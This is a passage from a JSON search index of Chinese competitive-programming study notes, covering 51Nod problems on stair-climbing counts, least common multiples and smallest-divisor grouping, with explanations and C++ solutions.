n, buffer; double sqrtBuffer; cin>>t; while(t--){ cin>>n; // \u662f3\u7684\u500d\u6570 if(n % 3 == 0){ cout<<\"Frame\"<<endl; }else{ // \u4e0d\u662f3\u7684\u500d\u6570 cout<<\"Alan\"<<endl; } } } \u8054\u7cfb\u90ae\u7bb1 \uff1acurren_wong@163.com CSDN \uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e \uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7 \uff1a \u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"3. \u4ee3\u7801"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/1.51Nod_2059_%E4%B8%8A%E5%8F%B0%E9%98%B6_easy/","text":"51Nod 2059 \u4e0a\u53f0\u9636 easy # \u76ee\u5f55 # 51Nod 2059 \u4e0a\u53f0\u9636 easy \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Input 1.4. Output 1.5. Sample Input 1.6. Sample Output 1.7. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801 1. \u9898\u76ee\u63cf\u8ff0 # 1.1. Limit # Time Limit: 1000 ms Memory Limit: 131072 kB 1.2. Problem Description # \u73b0\u5728\u5c0f\u74dc\u60f3\u901a\u8fc7\u53f0\u9636\u8d70\u4e0a\u5e73\u53f0\uff0c\u6700\u5e95\u5c42\uff08\u5c0f\u74dc\u6240\u5728\u7684\u5c42\uff09\u7f16\u53f7\u4e3a 1 \uff0c\u6700\u9876\u5c42\u7f16\u53f7\u4e3a n \u3002\u7531\u4e8e\u5c0f\u74dc\u7684\u817f\u6bd4\u8f83\u77ed\uff0c\u4ed6\u4e00\u6b21\u53ea\u80fd\u5411\u4e0a\u8d70 1 \u7ea7\u6216\u8005 2 \u7ea7\u53f0\u9636\u3002\u5c0f\u74dc\u60f3\u77e5\u9053\u4ed6\u6709\u591a\u5c11\u79cd\u65b9\u6cd5\u8d70\u4e0a\u5e73\u53f0\uff0c\u4f60\u80fd\u5e2e\u5e2e\u4ed6\u5417\uff1f 1.3. Input # \u4e00\u4e2a\u6574\u6570 n \uff0c\u5176\u4e2d 2 \\le n \\le 25 \u3002 1.4. Output # \u4e00\u884c\u4e00\u4e2a\u6574\u6570\uff0c\u8868\u793a\u5c0f\u74dc\u4e0a\u53f0\u9636\u7684\u65b9\u6848\u6570 1.5. Sample Input # 4 1.6. Sample Output # 3 \u4ece\u53f0\u9636 1 \u5230\u53f0\u9636 4 \uff0c\u53ef\u80fd\u65b9\u6848\u6709\uff1a 1\\to2\\to3\\to4 1\\to2\\to4 1\\to3\\to4 \u51713\u79cd\u3002 1.7. Source # 51Nod 2059 \u4e0a\u53f0\u9636 easy 2. \u89e3\u8bfb # \u4f7f\u521d\u59cb\u503c\u4e3a f(2) = 1 \uff0c f(3) = 2 \uff0c\u8ba1\u7b97\u6590\u6ce2\u90a3\u5951\u6570\u5217 f(n) = f(n-1) + f(n-2) \uff0c (n \\ge 4) \u3002 3. \u4ee3\u7801 # #include <iostream> #include <string.h> using namespace std; // \u5b58\u50a8\u6570\u5217 long long fabList[25]; // \u8ba1\u7b97\u6590\u6ce2\u90a3\u5951\u6570\u5217 long long fab(int n) { if (n == 2) { return fabList[2]; } else if (n == 3) { return fabList[3]; } else { return fab(n - 1) + fab(n - 2); } } int main() { long long n; // \u8bfb\u5165n scanf(\"%lld\", &n); // \u521d\u59cb\u5316 memset(fabList, 0, sizeof(fabList)); fabList[2] = 1; fabList[3] = 2; // \u8ba1\u7b97\u6590\u6ce2\u90a3\u5951\u6570\u5217 long long ans = fab(n); // \u8f93\u51fa printf(\"%lld\", ans); } \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com Github\uff1a https://github.com/CurrenWong \u6b22\u8fce\u8f6c\u8f7d/Star/Fork\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"1.51Nod 2059 \u4e0a\u53f0\u9636 easy"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/1.51Nod_2059_%E4%B8%8A%E5%8F%B0%E9%98%B6_easy/#51nod-2059-easy","text":"","title":"51Nod 2059 \u4e0a\u53f0\u9636 easy"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/1.51Nod_2059_%E4%B8%8A%E5%8F%B0%E9%98%B6_easy/#_1","text":"51Nod 2059 \u4e0a\u53f0\u9636 easy \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Input 1.4. Output 1.5. Sample Input 1.6. Sample Output 1.7. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801","title":"\u76ee\u5f55"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/1.51Nod_2059_%E4%B8%8A%E5%8F%B0%E9%98%B6_easy/#1","text":"","title":"1. \u9898\u76ee\u63cf\u8ff0"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/1.51Nod_2059_%E4%B8%8A%E5%8F%B0%E9%98%B6_easy/#11-limit","text":"Time Limit: 1000 ms Memory Limit: 131072 kB","title":"1.1. Limit"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/1.51Nod_2059_%E4%B8%8A%E5%8F%B0%E9%98%B6_easy/#12-problem-description","text":"\u73b0\u5728\u5c0f\u74dc\u60f3\u901a\u8fc7\u53f0\u9636\u8d70\u4e0a\u5e73\u53f0\uff0c\u6700\u5e95\u5c42\uff08\u5c0f\u74dc\u6240\u5728\u7684\u5c42\uff09\u7f16\u53f7\u4e3a 1 \uff0c\u6700\u9876\u5c42\u7f16\u53f7\u4e3a n \u3002\u7531\u4e8e\u5c0f\u74dc\u7684\u817f\u6bd4\u8f83\u77ed\uff0c\u4ed6\u4e00\u6b21\u53ea\u80fd\u5411\u4e0a\u8d70 1 \u7ea7\u6216\u8005 2 \u7ea7\u53f0\u9636\u3002\u5c0f\u74dc\u60f3\u77e5\u9053\u4ed6\u6709\u591a\u5c11\u79cd\u65b9\u6cd5\u8d70\u4e0a\u5e73\u53f0\uff0c\u4f60\u80fd\u5e2e\u5e2e\u4ed6\u5417\uff1f","title":"1.2. Problem Description"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/1.51Nod_2059_%E4%B8%8A%E5%8F%B0%E9%98%B6_easy/#13-input","text":"\u4e00\u4e2a\u6574\u6570 n \uff0c\u5176\u4e2d 2 \\le n \\le 25 \u3002","title":"1.3. Input"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/1.51Nod_2059_%E4%B8%8A%E5%8F%B0%E9%98%B6_easy/#14-output","text":"\u4e00\u884c\u4e00\u4e2a\u6574\u6570\uff0c\u8868\u793a\u5c0f\u74dc\u4e0a\u53f0\u9636\u7684\u65b9\u6848\u6570","title":"1.4. Output"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/1.51Nod_2059_%E4%B8%8A%E5%8F%B0%E9%98%B6_easy/#15-sample-input","text":"4","title":"1.5. Sample Input"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/1.51Nod_2059_%E4%B8%8A%E5%8F%B0%E9%98%B6_easy/#16-sample-output","text":"3 \u4ece\u53f0\u9636 1 \u5230\u53f0\u9636 4 \uff0c\u53ef\u80fd\u65b9\u6848\u6709\uff1a 1\\to2\\to3\\to4 1\\to2\\to4 1\\to3\\to4 \u51713\u79cd\u3002","title":"1.6. Sample Output"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/1.51Nod_2059_%E4%B8%8A%E5%8F%B0%E9%98%B6_easy/#17-source","text":"51Nod 2059 \u4e0a\u53f0\u9636 easy","title":"1.7. Source"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/1.51Nod_2059_%E4%B8%8A%E5%8F%B0%E9%98%B6_easy/#2","text":"\u4f7f\u521d\u59cb\u503c\u4e3a f(2) = 1 \uff0c f(3) = 2 \uff0c\u8ba1\u7b97\u6590\u6ce2\u90a3\u5951\u6570\u5217 f(n) = f(n-1) + f(n-2) \uff0c (n \\ge 4) \u3002","title":"2. \u89e3\u8bfb"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/1.51Nod_2059_%E4%B8%8A%E5%8F%B0%E9%98%B6_easy/#3","text":"#include <iostream> #include <string.h> using namespace std; // \u5b58\u50a8\u6570\u5217 long long fabList[25]; // \u8ba1\u7b97\u6590\u6ce2\u90a3\u5951\u6570\u5217 long long fab(int n) { if (n == 2) { return fabList[2]; } else if (n == 3) { return fabList[3]; } else { return fab(n - 1) + fab(n - 2); } } int main() { long long n; // \u8bfb\u5165n scanf(\"%lld\", &n); // \u521d\u59cb\u5316 memset(fabList, 0, sizeof(fabList)); fabList[2] = 1; fabList[3] = 2; // \u8ba1\u7b97\u6590\u6ce2\u90a3\u5951\u6570\u5217 long long ans = fab(n); // \u8f93\u51fa printf(\"%lld\", ans); } \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com Github\uff1a https://github.com/CurrenWong \u6b22\u8fce\u8f6c\u8f7d/Star/Fork\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"3. \u4ee3\u7801"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/2.51Nod_2175_ProjectEuler_5/","text":"51Nod 2175 ProjectEuler 5 # \u76ee\u5f55 # 51Nod 2175 ProjectEuler 5 \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Input 1.4. Output 1.5. Sample Input 1.6. Sample Output 1.7. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801 1. \u9898\u76ee\u63cf\u8ff0 # 1.1. Limit # Time Limit: 1000 ms Memory Limit: 131072 kB 1.2. Problem Description # 6\u662f\u6700\u5c0f\u7684\uff0c1\u52303\u6240\u6709\u6570\u7684\u500d\u6570\u3002 \uff086 = 1 \\times 6 = 2 \\times 3 = 3 \\times 2\uff09 2520\u662f\u6700\u5c0f\u7684\uff0c1\u523010\u7684\u6240\u6709\u6570\u5b57\u7684\u500d\u6570\u3002 \u8f93\u5165 n \uff0c\u8f93\u51fa\u6700\u5c0f\u7684\u6b63\u6574\u6570\uff0c\u4ed6\u662f1\u5230 n \u6240\u6709\u6570\u7684\u500d\u6570\u3002 1.3. Input # \u8f93\u5165\u7b2c\u4e00\u884c\u7ec4\u6570 T \uff0c\u63a5\u4e0b\u6765 T \u884c\uff0c\u6bcf\u884c\u4e00\u4e2a\u6574\u6570 n \u3002 (1 <= T <= 20) (1 <= N <= 20) 1.4. Output # \u5bf9\u4e8e\u6bcf\u7ec4\u6570\u636e\uff0c\u8f93\u51fa\u4e00\u4e2a\u6570\uff0c\u8868\u793a1\u5230n\u7684\u6700\u5c0f\u516c\u500d\u6570\u3002 1.5. Sample Input # 3 3 10 20 1.6. Sample Output # 6 2520 232792560 1.7. Source # 51Nod 2175 ProjectEuler 5 2. \u89e3\u8bfb # i = 1 \u65f6\uff0c\u5229\u7528 \u6b27\u51e0\u91cc\u5fb7\u7b97\u6cd5 \uff08\u8f97\u8f6c\u76f8\u9664\u6cd5\uff09\uff0c\u6c42 i \u548c i + 1 \u7684\u6700\u5927\u516c\u7ea6\u6570 gcd \uff0c i * (i + 1) \u9664\u4ee5\u6700\u5927\u516c\u7ea6\u6570 gcd \uff0c\u5373\u53ef\u5f97\u5230\u4e24\u4e2a\u6570\u7684\u6700\u5c0f\u516c\u500d\u6570 lcm \u3002 \u5bf9 i \\in [3 , n] \uff0c\u6c42 lcm \u548c i \u7684\u6700\u5c0f\u516c\u500d\u6570\uff0c\u518d\u8d4b\u503c\u7ed9 lcm \uff0c\u904d\u5386\u5b8c\u4ee5\u540e\u5373\u53ef\u6c42\u5f97\u7b54\u6848\u3002 3. \u4ee3\u7801 # #include <iostream> #include <string.h> using namespace std; long long numList[20]; long long gcd(long long a, long long b) { return b == 0 ? a : gcd(b, a % b); } int main() { long long n; // \u8bfb\u5165n scanf(\"%lld\", &n); // \u521d\u59cb\u5316\u6570\u7ec4 memset(numList, 0, sizeof(numList)); // \u6700\u5927\u516c\u7ea6\u6570buffer long long gcdBuffer = 0; // \u6700\u5c0f\u516c\u500d\u6570buffer long long lcmBuffer = 0; // \u8bfb\u5165\u6570\u7ec4 for (long long i = 0; i < n; i++) { // \u8f93\u5165 scanf(\"%lld\", &numList[i]); if (numList[i] > 1) { // \u8f97\u8f6c\u76f8\u9664\u6cd5 gcdBuffer = gcd(1, 2); // \u6c42\u6700\u5c0f\u516c\u500d\u6570 lcmBuffer = 1 * 2 / gcdBuffer; // \u5faa\u73af\u6c42\u6700\u5c0f\u516c\u500d\u6570 for (long long j = 3; j <= numList[i]; j++) { // \u8f97\u8f6c\u76f8\u9664\u6cd5 gcdBuffer = gcd(lcmBuffer, j); // \u6c42\u6700\u5c0f\u516c\u500d\u6570 lcmBuffer = j * lcmBuffer / gcdBuffer; } // \u8f93\u51fa printf(\"%lld\\n\", lcmBuffer); } else { // \u8f93\u51fa printf(\"%d\\n\", 1); } } } \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com Github\uff1a https://github.com/CurrenWong \u6b22\u8fce\u8f6c\u8f7d/Star/Fork\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"2.51Nod 2175 ProjectEuler 5"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/2.51Nod_2175_ProjectEuler_5/#51nod-2175-projecteuler-5","text":"","title":"51Nod 2175 ProjectEuler 5"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/2.51Nod_2175_ProjectEuler_5/#_1","text":"51Nod 2175 ProjectEuler 5 \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Input 1.4. Output 1.5. Sample Input 1.6. Sample Output 1.7. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801","title":"\u76ee\u5f55"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/2.51Nod_2175_ProjectEuler_5/#1","text":"","title":"1. \u9898\u76ee\u63cf\u8ff0"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/2.51Nod_2175_ProjectEuler_5/#11-limit","text":"Time Limit: 1000 ms Memory Limit: 131072 kB","title":"1.1. Limit"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/2.51Nod_2175_ProjectEuler_5/#12-problem-description","text":"6\u662f\u6700\u5c0f\u7684\uff0c1\u52303\u6240\u6709\u6570\u7684\u500d\u6570\u3002 \uff086 = 1 \\times 6 = 2 \\times 3 = 3 \\times 2\uff09 2520\u662f\u6700\u5c0f\u7684\uff0c1\u523010\u7684\u6240\u6709\u6570\u5b57\u7684\u500d\u6570\u3002 \u8f93\u5165 n \uff0c\u8f93\u51fa\u6700\u5c0f\u7684\u6b63\u6574\u6570\uff0c\u4ed6\u662f1\u5230 n \u6240\u6709\u6570\u7684\u500d\u6570\u3002","title":"1.2. Problem Description"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/2.51Nod_2175_ProjectEuler_5/#13-input","text":"\u8f93\u5165\u7b2c\u4e00\u884c\u7ec4\u6570 T \uff0c\u63a5\u4e0b\u6765 T \u884c\uff0c\u6bcf\u884c\u4e00\u4e2a\u6574\u6570 n \u3002 (1 <= T <= 20) (1 <= N <= 20)","title":"1.3. Input"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/2.51Nod_2175_ProjectEuler_5/#14-output","text":"\u5bf9\u4e8e\u6bcf\u7ec4\u6570\u636e\uff0c\u8f93\u51fa\u4e00\u4e2a\u6570\uff0c\u8868\u793a1\u5230n\u7684\u6700\u5c0f\u516c\u500d\u6570\u3002","title":"1.4. Output"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/2.51Nod_2175_ProjectEuler_5/#15-sample-input","text":"3 3 10 20","title":"1.5. Sample Input"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/2.51Nod_2175_ProjectEuler_5/#16-sample-output","text":"6 2520 232792560","title":"1.6. Sample Output"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/2.51Nod_2175_ProjectEuler_5/#17-source","text":"51Nod 2175 ProjectEuler 5","title":"1.7. Source"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/2.51Nod_2175_ProjectEuler_5/#2","text":"i = 1 \u65f6\uff0c\u5229\u7528 \u6b27\u51e0\u91cc\u5fb7\u7b97\u6cd5 \uff08\u8f97\u8f6c\u76f8\u9664\u6cd5\uff09\uff0c\u6c42 i \u548c i + 1 \u7684\u6700\u5927\u516c\u7ea6\u6570 gcd \uff0c i * (i + 1) \u9664\u4ee5\u6700\u5927\u516c\u7ea6\u6570 gcd \uff0c\u5373\u53ef\u5f97\u5230\u4e24\u4e2a\u6570\u7684\u6700\u5c0f\u516c\u500d\u6570 lcm \u3002 \u5bf9 i \\in [3 , n] \uff0c\u6c42 lcm \u548c i \u7684\u6700\u5c0f\u516c\u500d\u6570\uff0c\u518d\u8d4b\u503c\u7ed9 lcm \uff0c\u904d\u5386\u5b8c\u4ee5\u540e\u5373\u53ef\u6c42\u5f97\u7b54\u6848\u3002","title":"2. \u89e3\u8bfb"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/2.51Nod_2175_ProjectEuler_5/#3","text":"#include <iostream> #include <string.h> using namespace std; long long numList[20]; long long gcd(long long a, long long b) { return b == 0 ? a : gcd(b, a % b); } int main() { long long n; // \u8bfb\u5165n scanf(\"%lld\", &n); // \u521d\u59cb\u5316\u6570\u7ec4 memset(numList, 0, sizeof(numList)); // \u6700\u5927\u516c\u7ea6\u6570buffer long long gcdBuffer = 0; // \u6700\u5c0f\u516c\u500d\u6570buffer long long lcmBuffer = 0; // \u8bfb\u5165\u6570\u7ec4 for (long long i = 0; i < n; i++) { // \u8f93\u5165 scanf(\"%lld\", &numList[i]); if (numList[i] > 1) { // \u8f97\u8f6c\u76f8\u9664\u6cd5 gcdBuffer = gcd(1, 2); // \u6c42\u6700\u5c0f\u516c\u500d\u6570 lcmBuffer = 1 * 2 / gcdBuffer; // \u5faa\u73af\u6c42\u6700\u5c0f\u516c\u500d\u6570 for (long long j = 3; j <= numList[i]; j++) { // \u8f97\u8f6c\u76f8\u9664\u6cd5 gcdBuffer = gcd(lcmBuffer, j); // \u6c42\u6700\u5c0f\u516c\u500d\u6570 lcmBuffer = j * lcmBuffer / gcdBuffer; } // \u8f93\u51fa printf(\"%lld\\n\", lcmBuffer); } else { // \u8f93\u51fa printf(\"%d\\n\", 1); } } } \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com Github\uff1a https://github.com/CurrenWong \u6b22\u8fce\u8f6c\u8f7d/Star/Fork\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"3. \u4ee3\u7801"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/3.51Nod_2456_%E6%9C%80%E5%B0%8F%E7%BA%A6%E6%95%B0_V2/","text":"51Nod 2456 \u6700\u5c0f\u7ea6\u6570 V2 # \u76ee\u5f55 # 51Nod 2456 \u6700\u5c0f\u7ea6\u6570 V2 \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Input 1.4. Output 1.5. Sample Input 1.6. Sample Output 1.7. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801 4. \u53c2\u8003\u6587\u732e 1. \u9898\u76ee\u63cf\u8ff0 # 1.1. Limit # Time Limit: 1000 ms Memory Limit: 131072 kB 1.2. Problem Description # \u7ed9\u51fa n \u4e2a\u6570\uff0c\u5c06\u8fd9\u4e2a n \u6570\u8fdb\u884c\u5206\u7ec4\uff0c\u5206\u7ec4\u89c4\u5219\u4e3a\uff1a\u9664\u4e861\u4ee5\u5916\u6700\u5c0f\u7684\u7ea6\u6570\u76f8\u540c\u7684\u6570\u5b57\u5206\u4e3a\u4e00\u7ec4\u3002\u6700\u540e\uff0c\u8f93\u51fa\u8fd9\u4e2a\u6700\u5c0f\u7ea6\u6570\uff0c\u540c\u65f6\u6309\u7167\u4ece\u5c0f\u5230\u5927\u7684\u987a\u5e8f\u9010\u4e00\u8f93\u51fa\u8fd9\u4e9b\u6570\u5b57\u3002 \u4f8b\u5982\uff1a7\u4e2a\u6570\uff0c35 8 39 12 8 26 25 \u8f93\u51fa\u4e3a\uff1a 2 8 8 12 26\uff08 [8, 8, 12, 26] \u4e3a\u7ed9\u5b9a\u76847\u4e2a\u6570\u4e2d\uff0c\u4ee52\u4e3a\u6700\u5c0f\u7ea6\u6570\uff08\u96641\u4ee5\u5916\uff09\u7684\u6570\uff09 3 39\uff08 [39] \u4e3a\u7ed9\u5b9a\u76847\u4e2a\u6570\u4e2d\uff0c\u4ee53\u4e3a\u6700\u5c0f\u7ea6\u6570\uff08\u96641\u4ee5\u5916\uff09\u7684\u6570\uff09 5 25 35\uff08 [25\uff0c 35] \u4e3a\u7ed9\u5b9a\u76847\u4e2a\u6570\u4e2d\uff0c\u4ee55\u4e3a\u6700\u5c0f\u7ea6\u6570\uff08\u96641\u4ee5\u5916\uff09\u7684\u6570\uff09 1.3. Input # \u7b2c\u4e00\u884c\uff1a1\u4e2a\u6570 n\uff08n \\le 1000\uff09 \u540e\u9762 n \u884c\uff0c\u6bcf\u884c1\u4e2a\u6570 a[i]\uff082 <= a[i] <= 10000\uff09 1.4. Output # \u6309\u7167\u7ea6\u6570 d \u4ece\u5c0f\u5230\u5927\u7684\u987a\u5e8f\uff0c\u9010\u884c\u8f93\u51fa\u6240\u6709\u6700\u5c0f\u7ea6\u6570\uff08\u9664\u4e861\u4e4b\u5916\u7684\uff09\u4e3a d \u7684\u6570\u5b57\uff0c\u5e76\u4e14\u6bcf\u884c\u4e2d\u8f93\u51fa\u6570\u5b57\u7684\u987a\u5e8f\u4e5f\u662f\u4ece\u5c0f\u5230\u5927\u3002 1.5. Sample Input # 7 35 8 39 12 8 26 25 1.6. Sample Output # 2 8 8 12 26 3 39 5 25 35 1.7. Source # 51Nod 2456 \u6700\u5c0f\u7ea6\u6570 V2 2. \u89e3\u8bfb # \u8fd9\u9053\u9898\u6709\u4e24\u4e2a\u90e8\u5206\u9700\u8981\u5b8c\u6210 \u5206\u89e3\u6700\u5c0f\u7ea6\u6570 \u5206\u7ec4\u6392\u5e8f\u8f93\u51fa \u9996\u5148\u6211\u4eec\u8003\u8651\u5206\u89e3\u6700\u5c0f\u7ea6\u6570\u7684\u95ee\u9898\u3002 \u7ed9\u5b9a\u4e00\u4e2a\u6570 x \uff0c\u8981\u627e\u5230\u5176\u9664\u4e861\u4ee5\u5916\u6700\u5c0f\u7684\u7ea6\u6570 d \uff0c\u4ee5\u6b64\u53ef\u4ee5\u63a8\u65ad\u6211\u4eec\u8981\u627e\u7684\u8fd9\u4e2a\u7ea6\u6570\u80af\u5b9a\u662f\u4e00\u4e2a\u8d28\u6570\uff0c\u56e0\u4e3a\u5982\u679c d \u4e0d\u662f\u4e00\u4e2a\u8d28\u6570\uff0c\u90a3\u4e48\u6211\u4eec\u53ea\u8981\u5bf9\u5176\u518d\u505a\u4e00\u6b21\u8d28\u6570\u5206\u89e3\uff0c\u5c31\u53ef\u4ee5\u6c42\u5f97\u6bd4\u5b83\u66f4\u5c0f\u7684\u4e00\u4e2a\u7ea6\u6570\u3002 \u660e\u786e\u4e86\u6211\u4eec\u8981\u627e\u7684\u6570\u662f\u4e00\u4e2a\u8d28\u6570\u4ee5\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u8003\u8651\u5728\u6c42\u51fa\u8d28\u6570\u8868\u4ee5\u540e\u7528\u66b4\u529b\u641c\u7d22\u7684\u65b9\u6cd5\u6765\u6c42\u89e3\u3002\u7ed3\u5408\u8fd9\u9053\u9898\u7684\u6570\u636e\u8303\u56f4 [1, 10000] \u8003\u8651\uff0c\u5728\u8fd9\u4e2a\u8303\u56f4\u91cc\u9762\u53ea\u67091229\u4e2a\u8d28\u6570\uff0c\u800c\u8f93\u5165\u4e5f\u6700\u591a\u53ea\u67091000\u4e2a\u6570\uff0c 1229 \\times 1000 = 1.229 \\times 10 ^6 \uff0c\u4e5f\u5c31\u662f\u8bf4\u5728\u6c42\u51fa\u4e00\u4e07\u4ee5\u5185\u7684\u8d28\u6570\u4ee5\u540e\uff0c\u6211\u4eec\u6700\u591a\u53ea\u8981\u518d\u505a100\u591a\u4e07\u6b21\u8fd0\u7b97\u5c31\u80fd\u6c42\u51fa\u7ed3\u679c\u3002 \u800c\u6211\u4eec\u4f7f\u7528\u7684\u6c42\u8d28\u6570\u7684\u57c3\u6c0f\u7b5b\u7b97\u6cd5\u7684\u590d\u6742\u5ea6\u4e5f\u662f O(n \\log\\log n) \u7684\uff0c\u63a5\u8fd1 O(n) 